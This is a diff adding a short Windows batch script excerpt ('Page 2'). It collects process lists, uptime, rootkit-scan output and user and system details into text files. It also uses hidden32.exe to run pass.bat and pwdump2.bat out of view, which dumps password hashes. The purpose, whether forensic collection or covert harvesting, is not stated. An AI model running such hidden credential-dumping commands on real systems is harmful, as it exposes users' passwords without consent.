@@ -1,0 +1,16 @@
+Batch File Script Content (Page 2)
+
+pslist.exe >> info.txt
+Password.exe >> info.txt
+uptime.exe /s >> uptime.txt
+hidden32.exe find.bat
+rkdetector.exe >> rk.txt
+hidden32.exe pass.bat
+hidden32.exe pwdump2.bat
+
+cls
+echo Whoami >> info.txt
+echo Computer Name= %COMPUTERNAME% >> info.txt
+echo Login Name= %USERNAME% >> info.txt
+echo System Root= %SYSTEMROOT% >> info.txt
+...
